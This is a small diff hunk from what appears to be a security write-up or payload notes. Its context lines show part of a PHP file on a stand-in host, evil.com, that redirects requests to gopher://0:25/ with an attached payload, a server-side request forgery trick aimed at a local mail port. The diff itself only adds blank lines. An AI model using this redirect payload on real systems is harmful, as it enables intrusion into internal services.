@@ -29,3 +29,5 @@ Content of evil.com/redirect.php:
         header('Location: gopher://0:25/_'.$payload);
 ?>
 ```
+
+
